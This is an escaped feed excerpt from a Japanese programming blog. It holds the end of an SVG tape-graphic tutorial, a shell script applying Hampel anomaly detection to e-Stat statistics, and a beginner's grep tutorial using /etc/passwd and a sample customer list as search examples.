&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">svg&lt;/span> &lt;span class="na">width&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;400&amp;#34;&lt;/span> &lt;span class="na">height&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;35&amp;#34;&lt;/span> &lt;span class="na">xmlns&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;http://www.w3.org/2000/svg&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">path&lt;/span> &lt;span class="na">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;pathItem&amp;#34;&lt;/span>
&lt;span class="na">d&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;M5 5 Q 30 15 170 5&amp;#34;&lt;/span>
&lt;span class="na">stroke&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;black&amp;#34;&lt;/span>
&lt;span class="na">fill&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;transparent&amp;#34;&lt;/span>
&lt;span class="na">stroke-width&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;7&amp;#34;&lt;/span>
&lt;span class="na">stroke-linecap&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;round&amp;#34;&lt;/span>&lt;span class="p">/&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">svg&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>この手法は &lt;code>d&lt;/code> 属性値を変更することによって起こります。これは、パスが実際にどのように描画されるかを示すビジュアルです。&lt;/p>
&lt;script async src="//jsfiddle.net/wyoshi/670razvf/7/embed/">&lt;/script>
&lt;h2 id="カスタムsvgテープ">カスタムSVGテープ&lt;/h2>
&lt;p>クライアントのプロジェクトに携わっているとき、CSSでどこにでも配置可能で、1つのCSS変数のみで色を変更できるほどダイナミックな方法で、テープをセクションに取り付ける方法が必要でした。&lt;/p>
&lt;p>次の図を考えて見ましょう。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 181;
flex-basis: 434px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/svg-tape-1-1.png" data-size="2048x1130">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/svg-tape-1-1.png"
width="2048"
height="1130"
loading="lazy"
alt="SVGとCSSでおしゃれでクールな最新のデザインにするの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>Adobe Illustratorで、テープをレイヤーに分割しました。&lt;/p>
&lt;ul>
&lt;li>ベース：塗りつぶしの色を取ります&lt;/li>
&lt;li>透明な黒：暗い領域を示します&lt;/li>
&lt;li>透明な白：明るい領域を示します&lt;/li>
&lt;/ul>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 181;
flex-basis: 434px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/svg-tape-1-2.png" data-size="2048x1130">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/svg-tape-1-2.png"
width="2048"
height="1130"
loading="lazy"
alt="SVGとCSSでおしゃれでクールな最新のデザインにするの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>SVGコードを見てみましょう。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">svg&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">defs&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">g&lt;/span> &lt;span class="na">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;tape&amp;#34;&lt;/span> &lt;span class="na">fill&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;currentColor&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="c">&amp;lt;!-- path contents --&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">g&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">defs&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">svg&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>fill=currentColor&lt;/code>を追加したことに注意してください。&lt;br>
&lt;code>currentColor&lt;/code>キーワードは、CSS &lt;code>color&lt;/code> プロパティから値を継承するため、1つのプロパティのみを使用して色を動的に変更できます。&lt;br>
単色のベースと、明るい領域と暗い領域に他の2つのレイヤーがあることを考えると、色を変更すると、テープの外観が異なります。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 181;
flex-basis: 434px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/svg-tape-1-3.png" data-size="2048x1130">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/svg-tape-1-3.png"
width="2048"
height="1130"
loading="lazy"
alt="SVGとCSSでおしゃれでクールな最新のデザインにするの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>さらに良いことに、SVGをテンプレートに変換し、&lt;code>&amp;lt;use&amp;gt;&lt;/code> SVG要素の助けを借りて、SVGを複製せずにテープを再利用することができます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">svg&lt;/span> &lt;span class="na">style&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;display: none;&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">defs&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">g&lt;/span> &lt;span class="na">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;tape&amp;#34;&lt;/span> &lt;span class="na">fill&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;currentColor&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="c">&amp;lt;!-- path contents --&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">g&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">defs&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">svg&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="c">&amp;lt;!-- An example of using the tape from a template --&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">svg&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;tape&amp;#34;&lt;/span> &lt;span class="na">style&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;--angle: 10deg; color: red; --size: 120px;&amp;#34;&lt;/span> &lt;span class="na">aria-hidden&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;true&amp;#34;&lt;/span> &lt;span class="na">focusable&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;false&amp;#34;&lt;/span> &lt;span class="na">viewBox&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;0 0 123 47&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">use&lt;/span> &lt;span class="na">href&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;#tape&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">use&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">svg&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>&amp;lt;use&amp;gt;&lt;/code>要素を介してテープを追加した方法に注目してください。これの良いところは、CSS変数をインラインスタイルとして使用することです。&lt;br>
CSSは次のようになります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">tape&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">width&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nf">var&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">--&lt;/span>&lt;span class="n">size&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">transform&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">rotate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">var&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">--&lt;/span>&lt;span class="n">angle&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;script async src="//jsfiddle.net/wyoshi/1jrL4cg6/8/embed/html,css,result/dark/">&lt;/script>
&lt;h2 id="まとめ">まとめ&lt;/h2>
&lt;p>SVGを使用してUIコンポーネントを構築すると、作業がより簡単かつ簡単になります。一部のUIコンポーネントは、100％完璧なユースケースやSVG（アバターカットアウトなど）ではない場合がありますが、作業しているプロジェクトのコンテキストによって異なります。&lt;/p>
&lt;h2 id="おすすめの書籍">おすすめの書籍&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/SVG%e3%82%a8%e3%83%83%e3%82%bb%e3%83%b3%e3%82%b7%e3%83%a3%e3%83%ab%e3%82%ba-%e7%ac%ac2%e7%89%88-J-David-Eisenberg/dp/4873117976/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/51Mx7fILd8L.jpg" alt=" SVGエッセンシャルズ 第2版 ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> SVGエッセンシャルズ 第2版 &lt;/h2>
&lt;p> SVGの解説書。SVGは2001年にW3C勧告として公開されたXMLベースの画像フォーマットです。 ベクターグラフィックスなので拡大縮小、変形しても美しさが損なわれません。 会社のロゴをSVGで作る企業も増えていますし、D3.jsによるデータビジュアライゼーションでも基盤技術としてSVGが使われています。 本書では簡潔なサンプルを数多く使い、基本的な図形の作成、アニメーションや複雑なグラフィックスの作成、さらにはスクリプトによる制御など、SVGの基礎から応用までをわかりやすく解説します。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/%e3%80%90%e7%89%b9%e5%85%b8%e4%bb%98%e3%81%8d%e3%80%91HTML5-CSS3%e3%83%87%e3%82%b6%e3%82%a4%e3%83%b3-%e7%8f%be%e5%a0%b4%e3%81%ae%e6%96%b0%e6%a8%99%e6%ba%96%e3%82%ac%e3%82%a4%e3%83%89%e3%80%90%e7%ac%ac2%e7%89%88%e3%80%91-Compass-Books%e3%82%b7%e3%83%aa%e3%83%bc%e3%82%ba/dp/4839974594/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-na.ssl-images-amazon.com/images/I/51&amp;#43;8c&amp;#43;a5D7L.jpg" alt=" 【特典付き】HTML5&amp;amp;CSS3デザイン 現場の新標準ガイド【第2版】 (Compass Booksシリーズ) ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> 【特典付き】HTML5&amp;amp;CSS3デザイン 現場の新標準ガイド【第2版】 (Compass Booksシリーズ) &lt;/h2>
&lt;p> 体系的に学ぶHTMLとCSSの仕様と実践 フロントエンドエンジニアはじめ、Web制作に関わっている人のためのHTML5/CSS3ガイドブックです。 HTMLとCSSの最新仕様を整理するとともに、主要ブラウザの対応状況など、現時点でどのポイントに留意して制作を進めていけばよいか、現場で必要不可欠な情報を解説しています。 また、フレキシブルボックスレイアウトやグリッドレイアウトなど、現在知っておくべきHTML&amp;#43;CSSレイアウトの手法についても、詳細に解説しています。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>e-Stat hampelで時系列データの異常値検知</title><link>https://suzukiiichiro.github.io/posts/2022-01-25-01-ani/</link><pubDate>Mon, 24 Jan 2022 13:50:13 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-25-01-ani/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-25-01-ani/anal.jpg" alt="Featured image of post e-Stat hampelで時系列データの異常値検知" />&lt;h2 id="hampelによる異常値部分を追加しよう">hampelによる異常値部分を追加しよう&lt;/h2>
&lt;p>前回はgoogle custom search の検索結果を利用して社会的に関心の高そうな列の抽出を試みました。&lt;br>
今回は、以前紹介したhampelによる時系列データの異常値検知を組み込んで見たいと思います。&lt;br>
前回取得した「人権侵犯事件の種類別」ごとにtime_code、valueをまとめcsvにしてhampelメソッドを適用します。&lt;br>
time_codeは月次なのですが、月ごとの事件数はかなりムラがあって比較が難しいので年次にまとめます。&lt;/p>
&lt;pre tabindex="0">&lt;code>私人等に関するもの_暴行・虐待_家族間のもの_夫の妻に対するもの
date,value
2007,2537
2008,2645
2009,2461
2010,2250
2011,2242
2012,2031
2013,1683
2014,1477
2015,1352
2016,1297
2017,1113
2018,900
2019,782
2020,534
&lt;/code>&lt;/pre>&lt;p>コロナの影響なのか結構急激に下がっているのに検知しませんでした。&lt;br>
母数が流石に少なすぎるのかちょっと見直しが必要ですね。&lt;br>
閾値を色々変えてみましたがだめでした。&lt;br>
残念です。&lt;br>
年次のものについては一旦前の年との増減分を比較して閾値を超えたらアラートをあげるようにしようと思います。&lt;/p>
&lt;h2 id="プログラム">プログラム&lt;/h2>
&lt;p>プログラムは以下の通りです。&lt;br>
シェルプログラムから以前作ったhampelメソッドのpython を呼び出しています。&lt;br>
grep -e &amp;ldquo;^$nyear&amp;rdquo; -e &amp;ldquo;^$lyear&amp;rdquo; で直近２年間に異常値があった場合のみ検知するように絞りをかけています。&lt;/p>
&lt;pre tabindex="0">&lt;code>function getHampel(){
echo &amp;quot;$column&amp;quot;|while read line;do
cat &amp;quot;$STCSV&amp;quot;|grep &amp;quot;総数&amp;quot;|grep &amp;quot;,\&amp;quot;$line\&amp;quot;,&amp;quot;|$AWK -F, '{print $7&amp;quot;,&amp;quot;$10;}'|$SED -e &amp;quot;s|\&amp;quot;||g&amp;quot; &amp;gt; &amp;quot;$TMPHCSV&amp;quot;;
#月次だとムラがあって比較が難しいので年次にする
years=$(cat &amp;quot;$TMPHCSV&amp;quot;|cut -c 1-4|sort|uniq -c|grep &amp;quot;^ 12&amp;quot;|$AWK '{print $2;}');
echo &amp;quot;date,value&amp;quot; &amp;gt; &amp;quot;$TMPHYCSV&amp;quot;
echo &amp;quot;$years&amp;quot;|while read year;do
local mcnt=$(cat &amp;quot;$TMPHCSV&amp;quot;|grep &amp;quot;^$year&amp;quot;|$AWK -F, '{print $2;}'|$AWK '{sum+=$0} END{print sum;}');
echo &amp;quot;$year,$mcnt&amp;quot; &amp;gt;&amp;gt;&amp;quot;$TMPHYCSV&amp;quot;;
done
#0:date:2021001111 value:5230
nyear=$(date +%Y);
lyear=$((nyear-1));
hampelalert=$(python gethampel.py &amp;quot;$TMPHYCSV&amp;quot;|grep -e &amp;quot;^$nyear&amp;quot; -e &amp;quot;^$lyear&amp;quot;|tr &amp;quot;\n&amp;quot; &amp;quot;:&amp;quot;);
if [ -n &amp;quot;$hampelalert&amp;quot; ];then
echo &amp;quot;$line,$hampelalert&amp;quot;;
fi
done
}
&lt;/code>&lt;/pre></description></item><item><title>【grep特集】ざっくりわかるシェルスクリプト４</title><link>https://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/</link><pubDate>Mon, 24 Jan 2022 10:53:58 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/grep.jpg" alt="Featured image of post 【grep特集】ざっくりわかるシェルスクリプト４" />&lt;h2 id="はじめに">はじめに&lt;/h2>
&lt;p>grep（グレップ）コマンド。UNIX/Linuxにおいてこれほど歴史あり、強力なコマンドはありません。そして多くのユーザーがこのコマンドを使いこなしています。Webサーバーのログから特定のユーザーのみを抽出するちいさなスクリプトから、膨大なシステムログからロケットの軌道修正を計算する処理プログラムなど、半世紀もの長い間、一糸乱れることなく動き続けています。&lt;/p>
&lt;p>「grep」コマンドは、文字列、またはファイル内のをテキストを検索するための便利で不可欠なコマンドです。&lt;br>
「grep」コマンドの正式な名称は「“global regular expression print.”」です。&lt;br>
このコマンドの名前は、正規表現に基づいてコンテンツを検索できる「g / re / p」に由来しています。&lt;br>
「grep」コマンドには、ファイル内の文字列またはテキストを検索するため、複数の方法が用意されている。&lt;/p>
&lt;p>以下に「grep」コマンドを使用するいくつかの構文を示します。&lt;/p>
&lt;h2 id="カラー表示">カラー表示&lt;/h2>
&lt;p>まず、grep コマンドをカラー表示にしてみます。&lt;br>
以下のコマンドで、~/.bashrc を開きます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ vim ~/.bashrc
&lt;/code>&lt;/pre>&lt;p>以下の2行を ~/.bashrc に追記して保存して下さい。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:~/.bashrc" data-lang="bash:~/.bashrc">&lt;span class="nb">alias&lt;/span> &lt;span class="nv">grep&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;grep --color=auto&amp;#39;&lt;/span>
&lt;span class="nb">alias&lt;/span> &lt;span class="nv">egrep&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;egrep --color=auto&amp;#39;&lt;/span>
&lt;span class="nb">alias&lt;/span> &lt;span class="nv">fgrep&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;fgrep --color=auto&amp;#39;&lt;/span>
&lt;span class="nb">alias&lt;/span> &lt;span class="nv">ls&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;ls -FG&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>grep/egrep/fgrep そしてついでに lsコマンドもカラー表示に変更します。変更したら ~/.bashrcを以下のコマンドで再読込します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ . ~/.bashrc
$
&lt;/code>&lt;/pre>&lt;p>では、grep コマンドを使ってみます。&lt;br>
ここでは /etc/passwordファイルをgrepしてrootを検索してみます。&lt;/p>
&lt;pre>
$ grep root /etc/password
$
&lt;/pre>
&lt;h2 id="構文">構文&lt;/h2>
&lt;p>次の「grep」コマンドは、ファイル内の特定の文字列またはテキストを検索するために使用されます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ grep 検索文字列 ファイル名
&lt;/code>&lt;/pre>&lt;p>次の「grep」コマンドは、複数のファイル内の特定の文字列またはテキストを検索するために使用されます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ grep 検索文字列 filename1 filename2 filename3
$
&lt;/code>&lt;/pre>&lt;p>次は、空白を含む文字列を検索します。この場合はシングルクォーテーション「'」、またはダブるクォーテーション「&amp;quot;」で文字列を囲む必要があります。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ grep &amp;quot;検索文字列 検索文字列&amp;quot; filename1
$
&lt;/code>&lt;/pre>&lt;p>次の「grep」コマンドは、ファイル内の特定のオプションを含む文字列を検索するために使用されます。「 grep」コマンドでは、さまざまな目的でさまざまなオプションが使用されます。&lt;br>
ここでは「-v」を紹介します。「-v」オプションは、検索文字列を含まない行を抽出するオプションです。&lt;br>
このオプションは、非常に多くの場面で利用されます。&lt;/p>
&lt;pre>
$ cat /etc/passwd | head
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode. At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
bash-5.1$ cat /etc/passwd | head
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode. At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
$
bash-5.1$ cat /etc/passwd | head | grep "User"
# &lt;font color=red>User&lt;/font> Database
$
$ cat /etc/passwd | head | grep -v "User"
##
#
# Note that this file is consulted directly only when the system is running
# in single-user mode. At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
$
&lt;/pre>
&lt;p>まず、&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat /etc/passwd
$
&lt;/code>&lt;/pre>&lt;p>で、/etc/passwd ファイルをcat します。&lt;br>
catするというのは、ファイル内容を出力すると言う意味になります。さらに、&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat /etc/passwd | head
$
&lt;/code>&lt;/pre>&lt;p>の、headは、出力された /etc/passwd ファイルの冒頭１０行を抽出するというコマンド「head」です。「head」コマンドで -n5 オプションをつけることで冒頭5行目とすることもできます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat /etc/passwd | head -n5
$
&lt;/code>&lt;/pre>&lt;p>シェルスクリプトは、「| 」パイプでコマンドを連ねることで、前のコマンドに続いて、さらにコマンドの出力結果を絞り込むことができます。&lt;br>
次のコマンドは、/etc/passwd ファイルを catコマンドで表示し、headコマンドで冒頭１０行を抽出、さらに grep -v コマンドで User を除く行を出力します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat /etc/passwd | head | grep -v &amp;quot;User&amp;quot;
&lt;/code>&lt;/pre>&lt;p>「 grep -v 」コマンドは、指定した文字列を含まない行を抽出するという意味です。&lt;/p>
&lt;p>-v をつけなければ、User という文字列を含む文字列が抽出されることになります。&lt;/p>
&lt;p>さらにgrepには強力な「-i」オプションがあります。&lt;br>
「-i」オプションは、検索文字列の大文字、小文字を区別せずに抽出します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat /etc/passwd | head | grep -iv &amp;quot;user&amp;quot;
##
#
# Note that this file is consulted directly only when the system is running
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>grep コマンドで最も使われる書式は&lt;/dd>
&lt;dd>$ cat &amp;lt;ファイル名&amp;gt; | grep &amp;ldquo;検索文字列&amp;rdquo;&lt;/dd>
&lt;dd>です。&lt;/dd>
&lt;dd>以下、'-v' &amp;lsquo;-i&amp;rsquo; 二つのオプションをパイプで駆使すればgrepコマンドを使いこなしていると言っても過言ではありません。&lt;/dd>
&lt;/dl>
&lt;pre>
# -v 除外
$ cat &lt;ファイル名> | grep -v "検索文字列"
# -i 大文字小文字を区別しない
$ cat &lt;ファイル名> | grep -i "検索文字列"
&lt;/pre>
&lt;/div>
&lt;h2 id="一致する文字列を検索">一致する文字列を検索&lt;/h2>
&lt;p>では手始めに、次のコマンドで、Customers.txtファイルの内容を表示します。以下の内容をCustomers.txtとして保存して下さい。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:Customers.txt" data-lang="bash:Customers.txt">ID Name Email Phone
11 Md. Abir abir@gmail.com +8801813462458
23 Riya Chakroborti riya@gmail.com +8801937864534
45 Minhaz Ali ali@gmail.com +8801190761212
56 Maliha Chowdhury maliha@gmail.com +8801820001980
79 Maruf Sarkar maruf@gmail.com +8801670908966
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Customers.txtを表示します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat Customers.txt
ID Name Email Phone
11 Md. Abir abir@gmail.com +8801813462458
23 Riya Chakroborti riya@gmail.com +8801937864534
45 Minhaz Ali ali@gmail.com +8801190761212
56 Maliha Chowdhury maliha@gmail.com +8801820001980
79 Maruf Sarkar maruf@gmail.com +8801670908966
$
&lt;/code>&lt;/pre>&lt;p>次の「grep」コマンドは、Customers.txtファイルのテキスト「 MalihaChowdhury 」を検索します。検索テキストがファイルに存在する場合、テキストを含む行が印刷されます。&lt;/p>
&lt;pre>
$ cat Customers.txt
ID Name Email Phone
11 Md. Abir abir@gmail.com +8801813462458
23 Riya Chakroborti riya@gmail.com +8801937864534
45 Minhaz Ali ali@gmail.com +8801190761212
56 Maliha Chowdhury maliha@gmail.com +8801820001980
79 Maruf Sarkar maruf@gmail.com +8801670908966
$
$ cat Customers.txt | grep Ali
45 Minhaz &lt;font color=red>Ali&lt;/font> ali@gmail.com +8801190761212
$
&lt;/pre>
&lt;p>次の「grep」コマンドは、Customers.txtファイルのテキスト「 MalihaChowdhury 」を検索します。検索テキストがファイルに存在する場合、テキストを含む行が印刷されます。&lt;/p>
&lt;pre>
$ cat Customers.txt | grep 'Maliha Chowdhury'
56 &lt;font color=red>Maliha Chowdhury&lt;/font> maliha@gmail.com +8801820001980
$
&lt;/pre>
&lt;h2 id="一致しない文字列のみを検索">一致しない文字列のみを検索&lt;/h2>
&lt;p>「grep」コマンドの-vオプションは、ファイルから一致しない文字列を検索するために使用されます。この例では、-vオプションを指定した「grep」コマンドを使用して、最初の例で作成したCustomers.txtファイルから一致しない文字列を検索しています。&lt;/p>
&lt;p>次のコマンドは、customers.txtファイルの内容を表示します。&lt;/p>
&lt;pre>
$ cat Customers.txt
ID Name Email Phone
11 Md. Abir abir@gmail.com +8801813462458
23 Riya Chakroborti riya@gmail.com +8801937864534
45 Minhaz Ali ali@gmail.com +8801190761212
56 Maliha Chowdhury maliha@gmail.com +8801820001980
79 Maruf Sarkar maruf@gmail.com +8801670908966
$
$ cat Customers.txt | grep -v 'Abir'
ID Name Email Phone
23 Riya Chakroborti riya@gmail.com +8801937864534
45 Minhaz Ali ali@gmail.com +8801190761212
56 Maliha Chowdhury maliha@gmail.com +8801820001980
79 Maruf Sarkar maruf@gmail.com +8801670908966
$
&lt;/pre>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>-vオプションは、ファイルから一致しない文字列を検索するために使用されます。&lt;/dd>
&lt;dd>&lt;/dd>
&lt;dd>検索文字列を除外して検索する場合は、'-v&amp;rsquo;オプションを使います。&lt;br>
$ cat &amp;lt;ファイル名&amp;gt; | grep -v &amp;ldquo;検索文字列&amp;rdquo;&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="大文字と小文字を区別しない一致の検索文字列">大文字と小文字を区別しない一致の検索文字列&lt;/h2>
&lt;p>「grep」コマンドは、デフォルトで大文字と小文字を区別してファイルから文字列を検索します。&lt;br>
「grep」コマンドの &amp;lsquo;-i&amp;rsquo; オプションは、大文字と小文字を区別しない方法でファイルから文字列を検索するために使用されます。&lt;br>
この例では、'-i' オプションを指定した「grep」コマンドを使用して、前に作成したCustomers.txtファイルから大文字と小文字を区別しない方法で特定の文字列を検索しています。&lt;/p>
&lt;pre>
$ cat Customers.txt
ID Name Email Phone
11 Md. Abir abir@gmail.com +8801813462458
23 Riya Chakroborti riya@gmail.com +8801937864534
45 Minhaz Ali ali@gmail.com +8801190761212
56 Maliha Chowdhury maliha@gmail.com +8801820001980
79 Maruf Sarkar maruf@gmail.com +8801670908966
$
$ cat Customers.txt | grep -i 'minhaz'
45 &lt;font color=red>Minhaz&lt;/font> Ali ali@gmail.com +8801190761212
$
&lt;/pre>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>文字が大文字または小文字の文字列を含む1つ以上の行がファイルに存在する場合、その行が出力されます。&lt;/dd>
&lt;dd>大文字小文字を区別しないで検索する場合は、'-i&amp;rsquo;オプションを使います。&lt;br>
$ cat &amp;lt;ファイル名&amp;gt; | grep -i &amp;ldquo;検索文字列&amp;rdquo;&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="単語全体のみを検索">単語全体のみを検索&lt;/h2>
&lt;p>「grep」コマンドの &amp;lsquo;-w&amp;rsquo; オプションは、大文字と小文字を区別してファイルから単語全体を検索するために使用されます。&lt;br>
この例では、'-w' オプションを指定した「grep」コマンドを使用して、最初の例で作成されたCustomers.txtファイルから単語全体を検索しています。&lt;/p>
&lt;p>次のコマンドは、customers.txtファイルの内容を表示します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat Customers.txt
ID Name Email Phone
11 Md. Abir abir@gmail.com +8801813462458
23 Riya Chakroborti riya@gmail.com +8801937864534
45 Minhaz Ali ali@gmail.com +8801190761212
